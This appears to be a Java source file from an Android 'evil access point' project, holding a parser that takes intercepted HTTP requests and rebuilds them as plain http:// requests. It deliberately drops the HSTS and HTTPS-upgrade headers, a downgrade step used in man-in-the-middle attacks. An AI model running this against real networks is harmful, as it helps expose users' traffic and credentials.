package com.nibiru.evil_ap.proxy;

import android.support.v4.util.Pair;
import android.util.Log;

import com.nibiru.evil_ap.SharedClass;
import com.nibiru.evil_ap.log.Client;

import java.io.BufferedReader;
import java.io.StringReader;
import java.util.Vector;

import okhttp3.FormBody;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.Request;
import okhttp3.RequestBody;

/**
 * Created by Nibiru on 2016-11-03.
 */

class OkHttpParser {
    /**************************************CLASS FIELDS********************************************/
    protected final String TAG = getClass().getSimpleName();
    private Vector<Pair<String,String>> requestHeaders;
    private String requestLine;
    private StringBuffer messageBody;
    /**************************************CLASS METHODS*******************************************/
    OkHttpParser(){
        requestHeaders = new Vector<>();
        messageBody = new StringBuffer();
    }
    Request parse(String request, SharedClass shrObj, Client c, String method){
        BufferedReader reader = new BufferedReader(new StringReader(request));
        try {
            //read request line
            requestLine = reader.readLine(); // Request-Line ; Section 5.1
            //read header
            String header = reader.readLine();
            while (header != null && header.length() > 0) {
                //skip over HTTPS upgrade header and HSTS header
                if (!header.startsWith("Upgrade-Insecure-Requests")
                        && !header.startsWith("Strict-Transport-Security")
                        && !header.startsWith("User-Agent")){
                    appendHeaderParameter(header);
                }
                header = reader.readLine();
            }
            //read body
            String bodyLine = reader.readLine();
            while (bodyLine != null) {
                appendMessageBody(bodyLine);
                bodyLine = reader.readLine();
            }
            return buildOkHTTPRequest(requestLine, shrObj, c, method);

        } catch (Exception e) {
            Log.d(TAG, "Unable to parse request");
            e.printStackTrace();
            return null;
        }
    }

    private void appendHeaderParameter(String header) throws Exception {
        int idx = header.indexOf(":");
        if (idx == -1) {
            throw new Exception("Invalid Header Parameter: " + header);
        }
        Pair<String, String> p = new Pair<>(header.substring(0, idx), header.substring(idx + 1, header.length()));
        requestHeaders.add(p);
    }

    private void appendMessageBody(String bodyLine) {
        messageBody.append(bodyLine).append("\r\n");
    }

    private Request buildOkHTTPRequest(String requestLine, SharedClass shrObj, Client c, String
            method) throws NullPointerException{
        String url;
        String host="";
        String mediaTypeStr="";
        StringBuilder headers = new StringBuilder();
        String[] requestLineValues = requestLine.split("\\s+");
        Request.Builder builder = new Request.Builder();


        for(Pair<String, String> header : requestHeaders){
            if (header.first.equalsIgnoreCase("content-type")){
                mediaTypeStr = header.second.trim();
            }
            if (header.first.equalsIgnoreCase("host")){
                host = header.second.trim();
                url = "http://" + host + requestLineValues[1];
                Log.d(TAG, url);
                builder.url(url);
            }
            else{
                builder.addHeader(header.first, header.second);
                headers.append(header.first + ": " + header.second + "\n");
            }
        }
        //find request type
        MediaType mediaType = MediaType.parse(mediaTypeStr);
        RequestBody requestBody = FormBody.create(mediaType, messageBody.toString());
        switch (method) {
            case "GET":
                break;
            case "POST":
                builder.method("POST", RequestBody.create(null, new byte[0]))
                        .post(requestBody);
                break;
        }
        //TODO: testing logging
        //shrObj.addRequest(c, host, requestLine, headers.toString());
        return builder.build();
    }
}
